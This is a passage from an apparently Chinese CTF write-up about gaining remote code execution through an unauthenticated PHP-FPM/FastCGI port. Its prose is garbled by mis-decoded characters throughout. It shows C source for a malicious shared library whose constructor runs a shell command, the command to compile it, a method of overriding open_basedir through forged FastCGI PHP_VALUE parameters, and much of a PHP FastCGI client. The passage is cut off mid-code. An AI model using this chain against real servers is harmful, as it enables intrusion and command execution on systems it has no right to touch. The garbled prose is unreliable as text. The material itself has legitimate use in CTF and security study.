src="/article/bluehat2021/image-20210503142114737.png" class="" title="cgi" loading="lazy"><p>å‘ç°åœ¨9001ç«¯å£å¼€æœ‰FastCGIæœåŠ¡ï¼Œphpinfoä¸­ä¹Ÿè¡¨æ˜è¯¥é¡¹ç›®ä¸ºFPM/FastCGIï¼Œå¯ä»¥é€šè¿‡æœªæˆæƒæ‰“FPM rce</p><img src="/article/bluehat2021/image-20210503141634940.png" class="" title="phpinfo" loading="lazy"><h3 id="åŠ è½½æ¶æ„soæ–‡ä»¶"><a href="#åŠ è½½æ¶æ„soæ–‡ä»¶" class="headerlink" title="åŠ è½½æ¶æ„soæ–‡ä»¶"></a>åŠ è½½æ¶æ„soæ–‡ä»¶</h3><p>å†™.soæ‰©å±•</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls / >/var/www/html/a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><small>å°æ’æ›²ï¼šè¿™é‡Œå‘ç°è¾“å‡ºåˆ°<code>/var/www/html/1</code>å‘ç°ä¸è¡Œï¼Œç»“æœåå­—æ¢æˆaå°±å¯äº†ï¼Œç¦»è°±</small></p><p>ç¼–è¯‘ä¸‹</p><pre class="language-none"><code class="language-none">gcc hpdoger.c -fPIC -shared -o hpdoger.so</code></pre><p>æ³¨æ„çš„æ˜¯ç”¨macoså’Œlinuxç¼–è¯‘æ˜¯ä¸åŒçš„ï¼Œå¾—ç”¨linuxç¼–è¯‘ï¼Œç¼–è¯‘å®Œåä¸Šä¼ è‡³<code>/var/www/html</code></p><h3 id="ä¼ªé€ FastCGIè¯·æ±‚PHP-CGI"><a href="#ä¼ªé€ FastCGIè¯·æ±‚PHP-CGI" class="headerlink" title="ä¼ªé€ FastCGIè¯·æ±‚PHP-CGI"></a>ä¼ªé€ FastCGIè¯·æ±‚PHP-CGI</h3><p>åŒæ ·å†™åœ¨htmlç›®å½•</p><blockquote><p>ç”¨æˆ·è®¿é—®<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>ï¼Œå¦‚æœwebç›®å½•æ˜¯/var/www/htmlï¼Œé‚£ä¹ˆNginxä¼šå°†è¿™ä¸ªè¯·æ±‚å˜æˆå¦‚ä¸‹key-valueå¯¹ï¼š</p><blockquote><p>{<br>â€˜GATEWAY_INTERFACEâ€™: â€˜FastCGI/1.0â€™,<br>â€˜REQUEST_METHODâ€™: â€˜GETâ€™,<br>â€˜SCRIPT_FILENAMEâ€™: â€˜/var/www/html/index.phpâ€™,<br>â€˜SCRIPT_NAMEâ€™: â€˜/index.phpâ€™,<br>â€˜QUERY_STRINGâ€™: â€˜?a=1&amp;b=2â€™,<br>â€˜REQUEST_URIâ€™: â€˜/index.php?a=1&amp;b=2â€™,<br>â€˜DOCUMENT_ROOTâ€™: â€˜/var/www/htmlâ€™,<br>â€˜SERVER_SOFTWAREâ€™: â€˜php/fcgiclientâ€™,<br>â€˜REMOTE_ADDRâ€™: â€˜127.0.0.1â€™,<br>â€˜REMOTE_PORTâ€™: â€˜12345â€™,<br>â€˜SERVER_ADDRâ€™: â€˜127.0.0.1â€™,<br>â€˜SERVER_PORTâ€™: â€˜80â€™,<br>â€˜SERVER_NAMEâ€™: â€œlocalhostâ€,<br>â€˜SERVER_PROTOCOLâ€™: â€˜HTTP/1.1â€™<br>}</p></blockquote></blockquote><ul><li>é€šè¿‡åœ¨FastCGIåè®®ä¿®æ”¹PHP_VALUEå­—æ®µè¿›è€Œä¿®æ”¹php.iniä¸­çš„ä¸€äº›è®¾ç½®ï¼Œè€Œopen_basedir åŒæ ·å¯ä»¥é€šè¿‡æ­¤ç§æ–¹æ³•è¿›è¡Œè®¾ç½®ã€‚æ¯”å¦‚ï¼š<code>$php_value = &quot;open_basedir = /&quot;;</code></li><li>å› ä¸ºFPMæ²¡æœ‰åˆ¤æ–­è¯·æ±‚çš„æ¥æºæ˜¯å¦å¿…é¡»æ¥è‡ªWebserverã€‚æ ¹æ®PHPè§£æå™¨çš„æµç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ FastCGIå‘FPMå‘èµ·è¯·æ±‚ï¼ŒPHP_VALUEç›¸å½“äºæ”¹å˜.iniä¸­çš„è®¾ç½®ï¼Œè¦†ç›–äº†æœ¬èº«çš„open_basedir</li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. */</span><span class="token comment">/** * Handles communication with a FastCGI application * * @author      Pierrick Charron &lt;pierrick@webstart.fr> * @version     1.0 */</span><span class="token keyword">class</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span>          <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">PARAMS</span>               <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDIN</span>                <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDOUT</span>               <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDERR</span>               <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">DATA</span>                 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES</span>           <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span>    <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span>         <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span>              <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">FILTER</span>               <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span>         <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span>            <span class="token operator">=</span> <span class="token single-quoted-string string">'MAX_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span>             <span class="token operator">=</span> <span class="token single-quoted-string string">'MAX_REQS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span>           <span class="token operator">=</span> <span class="token single-quoted-string string">'MPXS_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span>           <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Socket     * @var Resource     */</span>    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Host     * @var String     */</span>    <span class="token keyword">private</span> <span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Port     * @var Integer     */</span>    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Keep Alive     * @var Boolean     */</span>    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Constructor     *     * @param String $host Host of the FastCGI application     * @param Integer $port Port of the FastCGI application     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment">// and default value for port, just for unixdomain socket</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Define whether or not the FastCGI application should keep the connection     * alive at the end of a request     *     * @param Boolean $b true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span>boolean<span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get the keep alive status     *     * @return Boolean true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Create a connection to the FastCGI application     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build a FastCGI packet     *     * @param Integer $type Type of the packet     * @param String $content Content of the packet     * @param Integer $requestId RequestId     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment">/* version */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment">/* type */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token comment">/* requestIdB1 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token comment">/* requestIdB0 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>     <span class="token comment">/* contentLengthB1 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>             <span class="token comment">/* contentLengthB0 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* paddingLength */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* reserved */</span>            <span class="token punctuation">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment">/* content */</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build an FastCGI Name value pair     *     * @param String $name Name     * @param String $value Value     * @return String FastCGI Name value pair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">/* nameData &amp; valueData */</span>        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token punctuation">.</span> <span class="token variable">$name</span> <span class="token punctuation">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a set of FastCGI Name value pairs     *     * @param String $data Data containing the set of FastCGI NVPair     * @return array of NVPair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Decode a FastCGI Packet     *     * @param String $data String containing all the packet     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token 